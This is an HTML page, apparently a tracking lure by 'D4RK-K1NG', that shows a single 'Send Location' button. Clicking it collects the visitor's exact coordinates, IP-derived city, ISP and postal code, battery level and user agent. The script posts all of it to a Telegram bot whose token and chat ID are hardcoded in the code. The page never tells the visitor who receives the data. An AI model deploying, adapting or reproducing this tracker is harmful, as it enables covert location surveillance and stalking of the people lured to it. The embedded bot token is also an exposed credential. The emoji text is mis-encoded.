<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send Location</title>
<style>
  body {
    background: #000;
    color: #00ffff;
    font-family: "Poppins", sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
  }
  button {
    background: #00ffff;
    border: none;
    color: #000;
    padding: 14px 30px;
    border-radius: 10px;
    font-size: 18px;
    cursor: pointer;
    transition: 0.3s;
    font-weight: bold;
  }
  button:hover {
    background: #00cccc;
    transform: scale(1.05);
  }
</style>
</head>
<body>

<button onclick="sendLocation()">üìç Send Location</button>

<script>
async function sendLocation() {
  if (!navigator.geolocation) return alert("‚ùå Geolocation not supported.");

  alert("üìç Requesting location permission...");

  navigator.geolocation.getCurrentPosition(async position => {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    let ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(()=>({}));
    let batteryInfo = await navigator.getBattery ? await navigator.getBattery() : null;
    let battery = batteryInfo ? Math.round(batteryInfo.level * 100) + "%" : "N/A";

    let now = new Date();
    let visitTime = now.toLocaleTimeString();
    let date = now.toLocaleDateString();

    const info = {
      country: ipData.country_name || "Unknown",
      state: ipData.region || "Unknown",
      city: ipData.city || "Unknown",
      town: ipData.org || "Unknown",
      pincode: ipData.postal || "Unknown",
      latitude: lat,
      longitude: lon,
      map: `https://www.google.com/maps?q=${lat},${lon}`,
      visitTime,
      date,
      ip: ipData.ip || "Unknown",
      battery,
      userAgent: navigator.userAgent
    };

    const token = "8177299368:AAEq8lA7DsfAM5tkR6kmF5rU-7Po6tuRq68";
    const chatId = "7109583573";

    const text = `
üìç *New Location Shared*
üåç Country: ${info.country}
üèôÔ∏è State: ${info.state}
üåÜ City: ${info.city}
üèòÔ∏è Town: ${info.town}
üßæ Pincode: ${info.pincode}

üì° Latitude: ${info.latitude}
üß≠ Longitude: ${info.longitude}
üó∫Ô∏è Map: ${info.map}

üïí Time: ${info.visitTime}
üìÖ Date: ${info.date}
üåê IP: ${info.ip}
üîã Battery: ${info.battery}
üíª Used Web: ${info.userAgent}

üß† Developed by D4RK-K1NG
`;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "Markdown"
      })
    });

    alert("‚úÖ Location sent successfully!");
  }, () => {
    alert("‚ùå Please allow location access to continue.");
  });
}
</script>
</body>
</html>
